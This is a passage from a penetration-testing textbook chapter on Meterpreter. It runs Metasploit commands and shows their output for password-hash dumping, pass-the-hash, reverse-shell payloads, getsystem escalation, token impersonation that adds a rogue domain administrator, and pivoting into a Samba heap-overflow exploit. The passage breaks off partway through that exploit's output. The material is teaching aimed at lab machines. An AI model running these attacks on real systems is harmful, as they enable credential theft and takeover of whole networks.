password. This shows an example of a simple extract of a username and password hashes. Shortly, we will extract our own username and password hashes from our Windows XP system.</p><a id="I_programlisting6_d1e7280" class="strong"/><pre class="programlisting">Administrator:500:e52cac67419a9a22cbb699e2fdfcc59e <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>
 :30ef086423f916deec378aac42c4ef0c <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>:::</pre><p class="calibre2">The first hash at <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e7296" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> is an LM hash, and the second at <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e7302" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> is an NTLM hash.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="dumping_the_password_hash">Dumping the Password Hash</h3></div></div></div><p class="calibre2">On your target machine, change your password to something complex, such as <span class="strong"><em class="calibre4">thisisacrazylongpassword&amp;&amp;!!@@##</em></span> and use Meterpreter to dump the username and password hashes (shown in the preceding code listing) from the target again. We will leverage the <code class="literal">use priv</code> command, which means we are running as a privileged user account.</p><p class="calibre2">To dump the Security Account Manager (SAM) database, we need to be running as SYSTEM to get around the registry restrictions and dump the protected SAM storage that contains our Windows usernames and passwords, as shown next. Try performing this scenario on a test virtual machine to see if you can dump the username and password hashes. In this listing, we execute the <code class="literal">hashdump</code> command, which dumps all the usernames and password hashes from the system.<a id="IDX-CHP-6-0070" class="strong"/></p><a id="I_programlisting6_d1e7327" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">use priv</code></strong>
Loading extension priv...success.
meterpreter &gt; <strong class="calibre3"><code class="calibre6">run post/windows/gather/hashdump</code></strong>
[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY 8528c78df7ff55040196a9b670f114b6...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hashes...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b75989f65d1e04af7625ed712ac36c29:::</pre><p class="calibre2">A hash value that starts with <span class="strong"><em class="calibre4">aad3b435</em></span> is simply an empty or null hash value — a placeholder for an empty string. (Something like <span class="strong"><em class="calibre4">Administrator:500:NOPASSWD:ntlmhash</em></span> is also null.) Because our password was longer than 14 characters, Windows can no longer store an LM hash, and it uses the standard <span class="strong"><em class="calibre4">aad3b435</em></span> . . . string, which represents a blank password.<a id="IDX-CHP-6-0071" class="strong"/><a id="IDX-CHP-6-0072" class="strong"/><a id="IDX-CHP-6-0073" class="strong"/><a id="IDX-CHP-6-0074" class="strong"/><a id="IDX-CHP-6-0075" class="strong"/><a id="IDX-CHP-6-0076" class="strong"/><a id="IDX-CHP-6-0077" class="strong"/><a id="IDX-CHP-6-0078" class="strong"/><a id="IDX-CHP-6-0079" class="strong"/><a id="IDX-CHP-6-0080" class="strong"/><a id="IDX-CHP-6-0081" class="strong"/></p><div class="book"><hr class="calibre5"/></div><div class="sidebar"><a id="the_problem_with_lm_hashes" class="strong"/><h3 class="title7">The Problem With Lm Hashes</h3><p class="calibre2">Just for fun, try the following: Change your password to something complex that is 14 characters or less. Then extract the password hashes from the system with <code class="literal">hashdump</code> and copy the first hash value (such as the portion beginning with <span class="strong"><em class="calibre4">aad3b435</em></span> in the preceding example), which is the LM hash. Next, search for one of the many online password crackers and submit your hash value. Wait a few minutes, click the refresh button a couple of times, and your password should be cracked. (Be careful not to use one of your real passwords, because the information is frequently posted to everyone who visits the site!)</p><p class="calibre2">This is a <span class="strong"><em class="calibre4">rainbow table</em></span> attack. A <span class="strong"><em class="calibre4">rainbow table</em></span> is a precomputed table used for reversing cryptographic hash functions, usually for cracking passwords. Rainbow tables use every combination of characters including 1–7, a–z, special symbols, and spaces. When you submit your hash to an online cracker, the site’s server searches through gigabytes of rainbow tables for your specific hash.</p></div><div class="book"><hr class="calibre5"/></div></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="pass_the_hash">Pass the Hash</h2></div></div></div><p class="calibre2">In the preceding example, we ran into a slight complication: We have the administrator’s username and password hashes, but we can’t crack the password in a reasonable time frame. If we don’t know the password, how can we log into additional machines and potentially compromise more systems with this one user account?</p><p class="calibre2">We can use the <span class="strong"><em class="calibre4">pass-the-hash</em></span> technique, which requires that we have only the password hash, not the password itself. Metasploit’s <span class="strong"><em class="calibre4">windows/smb/psexec</em></span> module makes this all possible, as shown here:</p><a id="I_programlisting6_d1e7420" class="strong"/><pre class="programlisting">msf&gt; <strong class="calibre3"><code class="calibre6">use windows/smb/psexec</code></strong> <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>
msf exploit(psexec)&gt; <strong class="calibre3"><code class="calibre6">set PAYLOAD windows/meterpreter/reverse_tcp</code></strong>
payload =&gt; windows/meterpreter/reverse_tcp
msf exploit(psexec)&gt; <strong class="calibre3"><code class="calibre6">set LHOST 192.168.33.129</code></strong>
LHOST =&gt; 192.168.33.129
msf exploit(psexec)&gt; <strong class="calibre3"><code class="calibre6">set LPORT 443</code></strong>
LPORT =&gt; 443
msf exploit(psexec)&gt; <strong class="calibre3"><code class="calibre6">set RHOST 192.168.33.130</code></strong>
RHOST =&gt; 192.168.33.130

<strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

msf exploit(psexec)&gt; <strong class="calibre3"><code class="calibre6">set SMBPass</code></strong>
<strong class="calibre3"><code class="calibre6">aad3b435b51404eeaad3b435b51404ee:b75989f65d1e04af7625ed712ac36c</code></strong> <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>
SMBPass =&gt; aad3b435b51404eeaad3b435b51404ee:b75989f65d1e04af7625ed712ac36c29
msf exploit(psexec)&gt; <strong class="calibre3"><code class="calibre6">exploit</code></strong>
[*] Connecting to the server...
[*] Started reverse handler
[*] Authenticating as user 'Administrator'...
[*] Uploading payload...
[*] Created \JsOvAFLy.exe...</pre><p class="calibre2">After we select the <span class="strong"><em class="calibre4">smb/psexec</em></span> module at <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e7467" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> and set the options for <code class="literal">LHOST</code>, <code class="literal">LPORT</code>, and <code class="literal">RHOST</code>, we set the <code class="literal">SMBPass</code> variable, and at <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e7486" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> we input the hash that we dumped earlier. As you can see, authentication is successful and we gain our Meterpreter session. We didn’t have to crack a password, and no password was needed. We’ve secured <span class="strong"><em class="calibre4">Administrator</em></span> privileges using the password hash alone.<a id="IDX-CHP-6-0082" class="strong"/><a id="IDX-CHP-6-0083" class="strong"/><a id="IDX-CHP-6-0084" class="strong"/><a id="IDX-CHP-6-0085" class="strong"/><a id="IDX-CHP-6-0086" class="strong"/></p><p class="calibre2">When we successfully compromise one system on a large network, in most cases that system will have the same administrator account on multiple systems. This attack would allow us to hop from one system to another without ever needing to crack the password itself.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="privilege_escalation">Privilege Escalation</h2></div></div></div><p class="calibre2">Now that we have access to the system, we can create a normal user account with limited permissions using the <code class="literal">net user</code> command. We’ll create a new user account to demonstrate how to elevate permissions as that user. (You will learn more about this in <a class="xref" href="part0012.html#exploitation_using_client-side_attacks">Chapter 8</a>.)</p><p class="calibre2">When we compromise a limited user account, we will run into restrictions that prevent us from executing commands that require administrative-level permissions. By elevating an account’s permissions, we overcome that restriction.</p><p class="calibre2">On a Windows XP target machine, we enter the following command:</p><a id="I_programlisting6_d1e7528" class="strong"/><pre class="programlisting">C:\Documents and Settings\Administrator&gt;<strong class="calibre3"><code class="calibre6">net user bob password123 /add.</code></strong></pre><p class="calibre2">Next, we create a Meterpreter-based payload, <span class="strong"><em class="calibre4">payload.exe</em></span>, copy it to the target’s XP machine, and run it under the user account <span class="strong"><em class="calibre4">bob</em></span>. This will be our new limited user account. In this example, we will use <span class="strong"><em class="calibre4">msfpayload</em></span> to create a Meterpreter-based payload as a normal Windows executable. (We’ll discuss <span class="strong"><em class="calibre4">msfpayload</em></span> in more detail in <a class="xref" href="part0011.html#avoiding_detection">Chapter 7</a>.)</p><a id="I_programlisting6_d1e7548" class="strong"/><pre class="programlisting">root@bt:/opt/framework3/msf3# <strong class="calibre3"><code class="calibre6">msfpayload windows/meterpreter/reverse_tcp</code></strong>
<strong class="calibre3"><code class="calibre6">LHOST=192.168.33.129 LPORT=443 X &gt; payload.exe</code></strong> <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>
root@bt:/opt/framework3/msf3# <strong class="calibre3"><code class="calibre6">msfcli multi/handler</code></strong>
 <strong class="calibre3"><code class="calibre6">PAYLOAD=windows/meterpreter/reverse_tcp</code></strong>
<strong class="calibre3"><code class="calibre6">LHOST=192.168.33.129 LPORT=443 E</code></strong> <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>
[*] Please wait while we load the module tree...
[*] Started reverse handler on 192.168.33.129:443
[*] Starting the payload handler...
[*] Sending stage (748032 bytes)
[*] Meterpreter session 1 opened (192.168.33.129:443 -&gt; 192.168.33.130:1056)
meterpreter &gt; <strong class="calibre3"><code class="calibre6">getuid</code></strong> <img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/>
Server username: IHAZSECURITY\bob</pre><p class="calibre2">The <code class="literal">LHOST</code> and <code class="literal">LPORT</code> options tell Metasploit that when it creates our Meterpreter payload it should connect back to our attacker machine on port 443. We then call the <span class="strong"><em class="calibre4">msfcli</em></span> interface to start a listener handler for us. This listener handler will wait for connections, and when one is received, it will spawn a Meterpreter shell.<a id="IDX-CHP-6-0087" class="strong"/><a id="IDX-CHP-6-0088" class="strong"/><a id="IDX-CHP-6-0089" class="strong"/><a id="IDX-CHP-6-0090" class="strong"/><a id="IDX-CHP-6-0091" class="strong"/><a id="IDX-CHP-6-0092" class="strong"/><a id="IDX-CHP-6-0093" class="strong"/><a id="IDX-CHP-6-0094" class="strong"/><a id="IDX-CHP-6-0095" class="strong"/><a id="IDX-CHP-6-0096" class="strong"/><a id="IDX-CHP-6-0097" class="strong"/><a id="IDX-CHP-6-0098" class="strong"/><a id="IDX-CHP-6-0099" class="strong"/><a id="IDX-CHP-6-0100" class="strong"/></p><p class="calibre2">On the attacker machine, we create a new Meterpreter stand-alone executable at <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e7643" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>, copy the executable to the Windows XP machine, and run it under the user account <span class="strong"><em class="calibre4">bob</em></span>.</p><p class="calibre2">We then set up a listener at <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e7654" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> to listen for the Meterpreter connection. After the target executes the payload on the system (<span class="strong"><em class="calibre4">payload.exe</em></span>), we see a limited user Meterpreter console <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e7663" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span>. We can, for example, generate a <span class="strong"><em class="calibre4">payload.exe</em></span> on a Back|Track machine, copy the executable to a Windows XP machine, and set up a listener to get a Meterpreter session.</p><p class="calibre2">As shown in the next listing, we drop to a Meterpreter shell at <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e7674" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> and enter <strong class="calibre3"><code class="calibre6">net user bob</code></strong>; we can see that user <span class="strong"><em class="calibre4">bob</em></span> is a member of the <span class="strong"><em class="calibre4">Users</em></span> group, is not an administrator, and has limited rights. We have a limited footprint from which to attack this device, and we can’t perform certain attacks, such as dumping the SAM database to extract usernames and passwords. (Luckily, Meterpreter has us covered, as you’ll see in a moment.) Our query complete, we press <span class="keycap">ctrl</span>-Z, which saves our Meterpreter session and keeps us in the exploited system.</p><a id="I_programlisting6_d1e7693" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">shell</code></strong> <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>
Process 2896 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
C:\&gt;<strong class="calibre3"><code class="calibre6">net user bob</code></strong>

<strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

Local Group Memberships      *Users
Global Group memberships     *None
The command completed successfully.
C:\&gt;<strong class="calibre3"><code class="calibre6">^Z</code></strong>
Background channel 1? [y/N]  <strong class="calibre3"><code class="calibre6">y</code></strong></pre><div class="book"><hr class="calibre5"/></div><div class="note"><h3 class="title4">Note</h3><p class="calibre2">Here’s another Meterpreter trick: While you’re in the Meterpreter console, enter <strong class="calibre3"><code class="calibre6">background</code></strong> to jump back into <span class="strong"><em class="calibre4">msfconsole</em></span> and leave the session running. Then enter <code class="literal">sessions -l</code> and <code class="literal">sessions -isessionid</code> to return to your Meterpreter console.</p></div><div class="book"><hr class="calibre5"/></div><p class="calibre2">Now let’s get administrative or SYSTEM rights. As shown in the next listing, we enter <strong class="calibre3"><code class="calibre6">use priv</code></strong> to load the <span class="strong"><em class="calibre4">priv</em></span> extensions, which gets us access to the privileged module (which may already be loaded). Next, we enter <strong class="calibre3"><code class="calibre6">getsystem</code></strong> in an attempt to elevate our privilege to that of local system, or administrator. We then verify that we have admin privileges with the <strong class="calibre3"><code class="calibre6">getuid</code></strong> command. The server username returned is <span class="strong"><em class="calibre4">NT AUTHORITY\SYSTEM</em></span>, which tells us that we’ve succeeded at gaining administrator access.</p><a id="I_programlisting6_d1e7748" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">use priv</code></strong>
Loading extension priv...success.
meterpreter &gt; <strong class="calibre3"><code class="calibre6">getsystem</code></strong>
...got system (via technique 4).
meterpreter &gt; <strong class="calibre3"><code class="calibre6">getuid</code></strong>
Server username: NT AUTHORITY\SYSTEM</pre><p class="calibre2">To switch back to the previous user account where we initially got our Meterpreter shell, we’d use <code class="literal">rev2self</code>.<a id="IDX-CHP-6-0101" class="strong"/><a id="IDX-CHP-6-0102" class="strong"/><a id="IDX-CHP-6-0103" class="strong"/><a id="IDX-CHP-6-0104" class="strong"/></p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="token_impersonation">Token Impersonation</h2></div></div></div><p class="calibre2">In <span class="strong"><em class="calibre4">token impersonation</em></span>, we grab a Kerberos token on the target’s machine and then use it in place of authentication to assume the identity of the user that originally created that token. Token impersonation is very beneficial for penetration tests and can be one of Meterpreter’s most powerful features.<a id="IDX-CHP-6-0105" class="strong"/></p><p class="calibre2">Consider the following scenario, for example: You’re performing a penetration test at your organization, and you successfully compromise the system and establish a Meterpreter console. A domain administrator account has logged on within the last 13 hours. When this account logs on, a Kerberos token is passed to the server (single sign-on) and is valid for a certain period of time. You exploit this system via the valid and active Kerberos token, and through Meterpreter you successfully assume the role of a domain administrator, without needing the password. Then you hack a domain administrator account or go after a domain controller. This is probably one of the easiest ways to gain access into a system and just another example of why Meterpreter is so useful.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="using_ps">Using ps</h2></div></div></div><p class="calibre2">For this example, we’ll use the Meterpreter function <code class="literal">ps</code> to list the applications running and show under which account they are running. We’ll use the domain name <span class="strong"><em class="calibre4">SNEAKS.IN</em></span> <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e7802" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> and the user account <span class="strong"><em class="calibre4">ihazdomainadmin</em></span> <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e7811" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>.</p><a id="I_programlisting6_d1e7817" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">ps</code></strong>

Process list
============

 PID   Name                 Arch  Session  User                          Path
 ---   ----                 ----  -------  ----                          ----
 0     [System Process]
 4     System               x86   0        NT AUTHORITY\SYSTEM
380    cmd.exe              x86   0      <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>SNEAKS.IN\ihazdomainadmin<img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>
   \System\
    Root\System32\cmd.exe

<strong class="calibre3"><code class="calibre6">. . . SNIP . . .</code></strong>

meterpreter &gt;</pre><p class="calibre2">As shown in the following listing, we leverage <code class="literal">steal_token</code> and the PID (380 in this case) to steal the token of that user and assume the role of the domain administrator:<a id="IDX-CHP-6-0106" class="strong"/><a id="IDX-CHP-6-0107" class="strong"/><a id="IDX-CHP-6-0108" class="strong"/><a id="IDX-CHP-6-0109" class="strong"/></p><a id="I_programlisting6_d1e7854" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">steal_token 380</code></strong>
Stolen token with username: SNEAKS.IN\ihazdomainadmin
meterpreter &gt;</pre><p class="calibre2">We have successfully impersonated the domain administrator account and Meterpreter is now running under the context of that user.</p><p class="calibre2">In some cases, <code class="literal">ps</code> may not list a running process running as a domain administrator. We can leverage <code class="literal">incognito</code> to list available tokens on the system as well. When performing a penetration test, we should check the output of both <code class="literal">ps</code> and <code class="literal">icognito</code> because the results may vary.</p><p class="calibre2">We load <code class="literal">incognito</code> with <code class="literal">use incognito</code> and then list tokens with <code class="literal">list_tokens -u</code>. Looking through the list of tokens, we see the <span class="strong"><em class="calibre4">SNEAKS.IN\ihazdomainadmin</em></span> user account at <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e7889" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>. Now we can pretend to be someone else.</p><a id="I_programlisting6_d1e7895" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">use incognito</code></strong>
Loading extension incognito...success.
meterpreter &gt; <strong class="calibre3"><code class="calibre6">list_tokens -u</code></strong>
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
SNEAKS.IN\ihazdomainadmin <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>
IHAZSECURITY\Administrator
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM

Impersonation Tokens Available
========================================
NT AUTHORITY\ANONYMOUS LOGON</pre><p class="calibre2">As shown in the next listing, we successfully impersonate the <code class="literal">ihazdomainadmin</code> token at <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e7914" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> and add a user account at <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e7920" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>, which we then give domain administrator rights at <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e7926" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span>. (Be sure to use two backslashes, <code class="literal">\\</code>, when entering the <code class="literal">DOMAIN\USERNAME</code> at <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e7939" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>.) Our domain controller is 192.168.33.50.</p><a id="I_programlisting6_d1e7945" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">impersonate_token SNEAKS.IN\\ihazdomainadmin</code></strong> <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>
[+] Delegation token available
[+] Successfully impersonated user SNEAKS.IN\ihazdomainadmin
meterpreter &gt; <strong class="calibre3"><code class="calibre6">add_user omgcompromised p@55w0rd! -h 192.168.33.50</code></strong> <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>
[*] Attempting to add user omgcompromised to host 192.168.33.50
[+] Successfully added user
meterpreter &gt; <strong class="calibre3"><code class="calibre6">add_group_user "Domain Admins" omgcompromised -h 192.168.33.50</code></strong>
 <img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/>
[*]   Attempting to add user omgcompromised to
 group Domain Admins on domain controller
    192.168.33.50
[+] Successfully added user to group</pre><p class="calibre2">When entering the <code class="literal">add_user</code> and <code class="literal">add_group_user</code> commands, be sure to specify the <code class="literal">-h</code> flag, which tells Incognito where to add the domain administrator account. In this case, that would be the IP address of a domain controller. The implications for this attack are devastating: Essentially, the Kerberos token on any system that a domain administrator logs into can be assumed and used to access the entire domain. This means that every server on your network is your weakest link!<a id="IDX-CHP-6-0110" class="strong"/><a id="IDX-CHP-6-0111" class="strong"/><a id="IDX-CHP-6-0112" class="strong"/><a id="IDX-CHP-6-0113" class="strong"/><a id="IDX-CHP-6-0114" class="strong"/><a id="IDX-CHP-6-0115" class="strong"/><a id="IDX-CHP-6-0116" class="strong"/></p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="pivoting_onto_other_systems">Pivoting onto Other Systems</h2></div></div></div><p class="calibre2"><span class="strong"><em class="calibre4">Pivoting</em></span> is a Meterpreter method that allows for the attack of other systems on a network through the Meterpreter console. For example, if an attacker were to compromise one system, he could use pivoting to compromise other systems on the same network or to access systems to which he could not otherwise route traffic, for whatever reason.</p><p class="calibre2">For example, suppose you’re performing a penetration test from the Internet. You compromise a system through a vulnerability and have a Meterpreter console to the internal network. You can’t directly access other systems on the network, because the system you compromised did not provide you with everything you need to do so, but you need to penetrate the network further. Pivoting will allow you to attack multiple systems on the internal network through the Internet, using the Meterpreter console.</p><p class="calibre2">In the following example, we’ll attack a system from one subnet and route that system to attack another system. First, we’ll exploit the Windows XP machine, and then we’ll piggyback the attack from our attacking machine to an Ubuntu system on the internal network. We’ll come from a 10.10.1.1/24 address and attack systems within the 192.168.33.1/24 network.</p><p class="calibre2">We’ll assume that we already have access to one server via a compromise and will focus on establishing a connection to that network. Next, we introduce external scripts written with Meterpreter that can be found in the <span class="strong"><em class="calibre4">scripts/meterpreter/</em></span> directory. These scripts offer additional functionality that we can use within Meterpreter.<a id="IDX-CHP-6-0117" class="strong"/></p><p class="calibre2">We begin by displaying local subnets on the compromised system within a Meterpreter session with <code class="literal">run get_local_subnets</code>, as shown at <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e8037" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>.</p><a id="I_programlisting6_d1e8043" class="strong"/><pre class="programlisting">[*] Meterpreter session 1 opened (10.10.1.129:443 -&gt; 192.168.33.130:1075)

meterpreter &gt; <strong class="calibre3"><code class="calibre6">run get_local_subnets</code></strong> <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>
Local subnet: 192.168.33.0/255.255.255.0
meterpreter &gt; <strong class="calibre3"><code class="calibre6">background</code></strong> <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>
msf exploit(handler) &gt; <strong class="calibre3"><code class="calibre6">route add 192.168.33.0 255.255.255.0 1</code></strong> <img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/>
msf exploit(handler) &gt; <strong class="calibre3"><code class="calibre6">route print</code></strong> <img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/>

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   192.168.33.0       255.255.255.0      Session 1 <img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre7"/></pre><p class="calibre2">We have successfully compromised our Windows XP machine and have full access to it. Next, we background our running session at <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e8089" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> and add a <code class="literal">route</code> command to the Framework at <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e8098" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span>, telling it to route the remote network ID over session 1, the background Meterpreter session. We then display active routes with <code class="literal">route print</code> at <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e8107" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span>, and we can clearly see at <span class="inlinemediaobject"><a id="I_inlinemediaobject6_d1e8114" class="strong"/><img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre8"/></span> that, just as we desired, the route is active.<a id="IDX-CHP-6-0118" class="strong"/><a id="IDX-CHP-6-0119" class="strong"/><a id="IDX-CHP-6-0120" class="strong"/></p><p class="calibre2">Next, we’ll set up a second exploit against the targeted Linux system. The specific exploit here is a Samba-based heap overflow, which would be vulnerable on our Metasploitable machine.</p><a id="I_programlisting6_d1e8131" class="strong"/><pre class="programlisting">use msf exploit(handler) &gt; <strong class="calibre3"><code class="calibre6">use linux/samba/lsa_transnames_heap</code></strong>
msf exploit(lsa_transnames_heap) &gt; <strong class="calibre3"><code class="calibre6">set payload linux/x86/shell/reverse_tcp</code></strong>
payload =&gt; linux/x86/shell/reverse_tcp
msf exploit(lsa_transnames_heap) &gt; <strong class="calibre3"><code class="calibre6">set LHOST 10.10.1.129</code></strong> <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>
LHOST =&gt; 10.10.1.129
msf exploit(lsa_transnames_heap) &gt; <strong class="calibre3"><code class="calibre6">set LPORT 8080</code></strong>
LPORT =&gt; 8080
msf exploit(lsa_transnames_heap) &gt; <strong class="calibre3"><code class="calibre6">set RHOST 192.168.33.132</code></strong> <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>
RHOST =&gt; 192.168.33.132
msf exploit(lsa_transnames_heap) &gt; <strong class="calibre3"><code class="calibre6">ifconfig</code></strong> <img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/>
[*] exec: ifconfig

eth0      Link encap:Ethernet  HWaddr 00:0c:29:47:e6:79
          inet addr:10.10.1.129  Bcast:10.10.1.255  Mask:255.255.255.0
          inet6 addr: fe80::20c:29ff:fe47:e679/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:23656 errors:0 dropped:0 overruns:0 frame:0
          TX packets:32321 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:4272582 (4.2 MB)  TX bytes:17849775 (17.8 MB)
          Interrupt:19 Base address:0x2000

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:600 errors:0 dropped:0 overruns:0 frame:0
          TX packets:600 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:41386 (41.3 KB)  TX bytes:41386 (41.3 KB)

msf exploit(lsa_transnames_heap) &gt; <strong class="calibre3"><code class="calibre6">exploit</code></strong>

[*] Started reverse handler on 10.10.1.129:8080
[*] Creating nop sled....
[*] Trying to exploit Samba with address 0xffffe410...
[*] Connecting to the SMB service...
[*] Binding to 12345778-1234-abcd-ef00-0123456789
ab:0.0@ncacn_np:192.168.33.132[\lsarpc] ...
[*] Bound to 12345778-1234-abcd-ef00-0123456789ab:0.0@
ncacn_np:192.168.33.132[\lsarpc] ...
[*] Calling the vulnerable function...
[+] Server did not respond, this is expected
[*] Trying to exploit Samba with address 0xffffe411...
[*] Connecting to the SMB service...
[*] Binding to 12345778-1234-abcd-ef00-0123456789ab:0.0
@ncacn_np:192.168.33.132[\lsarpc] ...
[*] Bound to 12345778-1234-abcd-ef00-0123456789ab:0.0
@ncacn_np:192.168.33.132[\lsarpc] ...
[*] Calling the vulnerable function...
[+] Server did not respond, this is expected
[*] Trying to exploit Samba with address 0xffffe412...
[*] Connecting to the SMB service...
[*] Binding to 12345778-1234-abcd-ef00-0123456789ab:
0.0@ncacn_np:192.168.33.132[\lsarpc] ...
[*] Bound to 12345778-1234-abcd-ef00-0123
